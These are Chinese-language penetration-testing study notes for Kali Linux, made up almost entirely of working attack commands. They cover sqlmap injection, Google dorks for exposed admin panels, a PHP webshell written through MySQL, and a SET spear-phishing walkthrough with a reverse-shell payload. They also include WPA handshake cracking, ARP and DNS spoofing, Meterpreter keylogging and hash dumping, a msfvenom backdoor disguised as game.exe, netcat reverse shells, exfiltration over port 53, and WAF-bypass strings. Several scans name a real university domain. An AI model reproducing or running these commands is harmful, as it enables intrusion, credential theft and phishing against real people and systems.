环境：
kali

更新源：
/etc/apt/sources.list

下载更新：
apt-get update

更新系统：
apt-get dist-upgrade

启动服务：
service 服务名 start|stop|restart|status

proxy代理
（1）正向代理：
【内部网络       proxy 】       外部网络
作用：
访问无法访问的服务器
cache作用
客户端访问授权
隐藏访问者踪迹
（2）反向代理：
内部网络    【反向代理   web服务器】
（3）透明代理：用户不知道
用户 交换机   行为管理   服务器

kali代理工具：
（1）mitmproxy:中间人代理攻击工具
mitmproxy -p 8080
（2）burpsuit：攻击web应用程序的集成平台

（3）owasp-zap：攻击代理（ZAP）
启动：owasp-zap
（4）paros：漏洞扫描的代理程序，web站点爬行
启动：paros
（5）proxystrike
（6）vega
（7）webscarab：代理软件

SQL注入
(1)收集测试站点(google hack)：公司 inurl:asp?id=
(2)测试是否存在注入点：
'
and 1=1 and 1=2
or 1=1    or 1=2
id=-
（3）sqlmap工具注入access
sqlmap -u "url" --dbs --current-user
sqlmap -u "url"  --tables
sqlmap -u "url" -T 表名 --columns
sqlmap -u "url" -T 表名  -C 字段名 --dump
（4）查找管理入口
御剑
网站最下面
nikto（扫描隐藏目录）nikto -host www.sspu.edu.cn
查看网页源代码
（5）上传一句话木马
（6）提权
利用网站编程漏洞提权


PHP网站注入(mysql)
sqlmap -u "url" --dbs --current-user
sqlmap -u "url" --dbms mysql -D 数据库 --tables 
sqlmap -u "url" --dbms mysql --tables 
sqlmap -u "url" --dbms mysql  -D 数据库 -T 表名 --columns
sqlmap -u "url" --dbms mysql  -D 数据库 -T 表名 -C 字段名 --dump


Google hacker 实战
（1）寻找Jenkins的管理面板(源代码泄露)
inurl:8080 intitle:"Dashboard [Jenkins]"
（2）利用信息搞定xampp（PHPmyadmin）
inurl:"xampp/index" intext:"XAMPP for Windows"  <1.7.3
寻找phpmyadmin管理页面，通过mysql的root权限插入一句话木马，获取服务器管理权限
连接mysql数据库：mysql -u root -h IP地址 -p 密码
创建表：create table aa(packet text) type=MYISaM
插入数据：insert into aa(packet) values('<pre><body bgcolor=silver><? @system($_GET["cmd"]); ?></bpdy></pre>');
加载数据执行：select * into outfile “C:/phpstudy/WWW/js.php”from aa；
（3）后门查找 
intitle:"[1n73ct10n privat shell]="intitle:"WSO2.4" [Sec.info],[Files],]Console],[sql],[Php],[safe mode]
（4）Google hack database



SET(social engineer toolkit)
社会工程学利用套件，结合metasploit使用
启动：root@kali:~# setoolkit 
   1) Social-Engineering Attacks                社会工程学攻击
   2) Penetration Testing (Fast-Track)         渗透测试
   3) Third Party Modules                           第三方模块
   4) Update the Social-Engineer Toolkit     更新软件
   5) Update SET configuration                   更新配置
   6) Help, Credits, and About                      帮助
选择1社会工程学攻击：set> 1
  1) Spear-Phishing Attack Vectors    鱼叉式网络钓鱼攻击
   2) Website Attack Vectors              网页攻击
   3) Infectious Media Generator       传染媒介式（俗称木马）
   4) Create a Payload and Listener    建立payloaad和listener
   5) Mass Mailer Attack                    邮件群发攻击
   6) Arduino-Based Attack Vector     Arduino基础攻击
   7) Wireless Access Point Attack Vector  无线接入点攻击
   8) QRCode Generator Attack Vector      二维码攻击
   9) Powershell Attack Vectors                 Powershell攻击
  10) SMS Spoofing Attack Vector             短信欺骗攻击
  11) Third Party Modules                         第三方模块
  99) Return back to the main menu.         返回上级
选择 鱼叉式网络钓鱼攻击：set> 1
   1) Perform a Mass Email Attack                   群发邮件攻击
   2) Create a FileFormat Payload                    创建文件作为附件
   3) Create a Social-Engineering Template      创建社会工程学模版
选择 6) Microsoft Word RTF pFragments Stack Buffer Overflow (MS10-087)：set:payloads>6
选择连接方式： 4) Windows Reverse TCP Shell (x64)：set:payloads>4
设置监听地址（本机地址）set> IP address for the payload listener (LHOST): 192.168.253.132
设置监听端口（默认443）：set:payloads> Port to connect back on [443]:
保存在：/root/.set/
是否重命名：选择2：
set:phishing>2
set:phishing> New filename:hello.ppt
    1. Keep the filename, I don't care.                    保持
    2. Rename the file, I want to be cool.               重命名
选择发送方式：选择1个：set:phishing>1
 1.  E-Mail Attack Single Email Address        一个邮件
   2.  E-Mail Attack Mass Mailer                   群发
定义邮件内容：set:phishing>2
 1. Pre-Defined Template                         预定义模板
   2. One-Time Use Email Template           选择一个模板
subject of the email：邮件主题：hello
Next line of the body: 文件内容：hello，js
Send email to:发送给那个：1003973737@qq.com
设置发送的邮箱：
1. Use a gmail Account for your email attack.   使用Gmail
2. Use your own server or open relay               使用自己邮箱
set:phishing>1
set:phishing> Your gmail email address:ailalaxiao@gmail.com
set:phishing> The FROM NAME user will see:设置收件人看见的名字：js
Email password: 邮箱密码
set:phishing> Flag this message/s as high priority? [yes|no]:是否是紧急邮件：yes
出现错误可以输入：return查看详细的错误信息
set:phishing> Setup a listener [yes|no]:在本地是否建立监听：yes


网站攻击

1、java applet攻击（网页弹窗那种）
2、Metasploit 浏览器漏洞攻击
3、钓鱼网站攻击
4、标签钓鱼攻击
5、网站jacking攻击（这个真心不明白，好像也和java的攻击方式有些相同）
6、多种网站攻击方式
7、全屏幕攻击（不明所以的玩意，只能够对谷歌邮箱和脸书用）
99、返回上级

java applet攻击：
 
   1) Web Templates           使用web模板
   2) Site Cloner                  基于web克隆
   3) Custom Import            指定以导入

  99) Return to Webattack Menu
选择nat方式：set> Are you using NAT/Port Forwarding [yes|no]: no


网络扫描
（1）nmap
主机扫描：
-sL：列表扫描；-sP：ping扫描；-P0：无ping扫描；-PS：tcp SYNping扫描；-PR：ARP ping扫描
-n:不用域名解析
-R：进行域名解析
端口扫描：
-sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
  -sU: UDP Scan
  -sN/sF/sX: TCP Null, FIN, and Xmas scans
  --scanflags <flags>: Customize TCP scan flags
  -sI <zombie host[:probeport]>: Idle scan
  -sY/sZ: SCTP INIT/COOKIE-ECHO scans
  -sO: IP protocol scan
  -b <FTP relay host>: FTP bounce scan
操作系统探测：
 -O: Enable OS detection
  --osscan-limit: Limit OS detection to promising targets
  --osscan-guess: Guess OS more aggressively
服务程序探测：
-sV
高级选项：
--iflist(查看本地路由和信息）
-e（指定MAC地址和IP地址）
-D（指定地址）（-D 192.168.1.1,192.168.2.2虚假IP地址）
-ME（真正IP地址）
--spoof-mac（虚拟MAC地址）
-F：快速扫描
使用：
Usage: nmap [Scan Type(s)] [Options] {target specification}
主机扫描（-SP（快速ping扫描），-Pn（Internet扫描），-sn（探测存活主机））
端口扫描（-sS,-sT,-sU,-v）
操作系统探测（-sT,-O,-sA，-sS）
服务程序探测（-sV,-sA，-sS）
（2）zmap




web信息收集
（1）指纹识别
1.Telnet 域名/IP 80
root@kali:~# telnet wwwsspu.edu.cn 80
2.curl --head URL（推荐）
root@kali:~# curl --head www.sspu.edu.cn
IIS version           Windows server version
iis5.0                        win2000
IIS5.1                        WinXP
iis6.0                          win2003
iis7.0                          win2008，win Vista
iis7.5                          win2008 R2 ，win7
3.xprobe2（ICMP进行操作系统探测，对老操作系统识别较为准确，现在是2005年版本）
root@kali:~# xprobe2 -v www.sspu.edu.cn
4.nmap（推荐）
root@kali:~# nmap -A -v -O www.sspu.edu.cn
5.maltegoce

web漏洞发现
（1）HTTP扫描
web crawlers（网站抓取）
1.webshag-gui(SPIDER:列出目录结构）
2.w3af（图形化推荐）
3.owasp-zap（图形化推荐）

web攻击
1.sqlmap(access database)
sqlmap -u "url"
sqlmap -u "url" --tables
sqlmap -u "url" --colunms -T 表名
sqlmap -u "url" -C 列名 -T 表名 --dump


社会工程学攻击工具SET（setoolkit）


wifi破解
工具：aircrack-ng（WEP，WPS）
1.开启监听模式
root@kali:~# airmon-ng start wlan0
2.扫描WiFi网络
root@kali:~# airodump-ng wlan0mon
指定信道扫描：
root@kali:~# airodump-ng -c 11  wlan0mon
BSSID              	PWR    RXQ    Beacons    #Data, #/s  CH  MB   ENC      CIPHER    AUTH   ESSID
48:7D:2E:3D:AD:3C   -38       30        3                  0             11   54e. WPA2   CCMP     PSK       13-305  
3.抓包：
airodump-ng --bssid MAC地址 -c 频道 -w crack wlan0mon   （直到抓到handshake包，出现WPA handshake）
4.OS攻击：
aireplay-ng -0 10 -a BSSID -c STATION wlan0mon
5.进行破解：
aircrack-ng -w 字典名称 test-*.cap(握手包名称)


内网扫描：
1.fping
-s：回显结果
-r：尝试次数
-g：范围
root@kali:~# fping -sga 192.168.253.1 192.168.253.254 
2.arping（探测主机是否存活）
root@kali:~# arping -c 5 192.168.253.133
3.nmap
root@kali:~# nmap -Pn 192.168.253.0


密码破解
1.hydra
root@kali:~# hydra -l administrator -P passwd.txt -t 10 -vV 192.168.253.133 smb

局域网攻击
1.macof（服务器上不要使用）（填充交换机Mac地址，充满假地址，unknown unicast单播包）
（1）macof（开启5个端口）
（2）dsniff （进行捕获数据包）
2.ARP中间人攻击（arpspoof）
（1）启用转发功能:echo 1 > /proc/sys/net/ipv4/ip_forward
（2）开始欺骗：arpspoof -i eth0 -t 192.168.253.133 192.168.253.132
（3）捕获数据包：wireshark（进行分析）
3.ettercap（dns欺骗，ARP欺骗，ICMP欺骗，DOS）
ARP欺骗:
1.开启图形化界面：ettercap -G
2.抓取数据：dsniff
dns欺骗：
1.开启图形化界面：ettercap -G
2.编辑/etc/ettercap/etter.conf


msfconsole 
漏洞攻击：
1.启动：root@kali:~# msfconsole 
2.查看链接数据库状态：msf > db_status 
3.search：查找漏洞
4.use：使用漏洞
5.show options：查看需要配置的参数
6.set：设置漏洞参数
7.run/exploit：执行攻击
8.session -i：查看建立会话
控制肉鸡：
1.选定会话：session -i 2
2.getuid:查看进程
3.ps：查看进程
4.migrate 进程号：改变进程
5.systeminfo：查看系统信息
6.hashdump:导出hash
7.run getgui -u root -p 123456：添加用户
8.run getgui -e :打开远程桌面连接
9.shell：进入cmd
10：net localgroup administrators root:添加root到管理员组
11：keyscan_start:记录键盘记录
12：keyscan_dump：查看键盘记录
13：keyscan_stop：停止记录

生成后门：
1.生成后门程序：msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=4444 x > /root/Desktop/game.exe
2.开始监听：
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
shutdown /s /t 0

生成shellcode（shellcode一段代码）
1.use Windows/shell/bind_tcp LPORT=443
2.set
3.generate -t dword
4.use exploit/multi/handler
set payload windows/shell/bind_tcp


WAF（web应用防护系统，网站应用级入侵防御系统，web application Firewall）：防止未知攻击，检测用户的数据，进行匹配
WAFW00F（简单防火墙探测软件，是否存在WAF）：
wafw00f www.sspu.edu.cn

绕过正则表达方式
1.ASCII
（1）%0Aand 1=1（%0D，%0C）
（2）/*    */
（3）/*!username*/
（4）' and 1=1
（5）'and /*--*/1=1
（6）注释：/* */，#


netcat（nc）
-z：扫描时使用
-n：以数字显示IP地址
-v：显示详细信息
-l：监听端口
-p：根端口号
1.端口扫描：
nc -v -n -z IP地址 端口数
root@kali:~# nc -z -v -n 192.168.1.108 1-1025
2.端口连接：
nc IP地址 端口
get /
3.监听端口：
nc -l -p port
4.后门：我监听你来连
nc -d -L -p 端口 -e 程序
监听：C:\Users\hqj>nc -d -l -p 8888 -e cmd.exe
连接：root@kali:~# nc 192.168.1.108 8888
5.反弹后门：
（1）服务端:nc -l -p 端口
root@kali:~# nc -l -p 8888
（2）客户端：nc -d IP地址 端口 -e 程序
C:\Users\hqj>nc -d 192.168.1.109 8888 -e cmd.exe
6.蜜罐：
nc -l -p 端口
7.传送文件：
服务端：nc -l 端口 < file.txt
客户端：nc -n IP地址 端口 > file.txt
win - kali
kali：root@kali:~# nc -l -p 555 > js.txt
win:C：\Users\hqj>nc 192.168.1.109 555 < Desktop/1.txt
隐蔽连接：
C:\Users\hqj>nc -u 192.168.1.109 53 < Desktop/1.txt
root@kali:~# nc -l -u -p 53 > 2.txt

社会工程学WiFi破解
1.创建热点
安装：apt-get install isc-dhcp-server
编辑：/etc/dhcp/dhcp.conf
2.激活热点
airmon-ng start wlan0
airbase-ng -e ESSID -c 6 wlan0mon








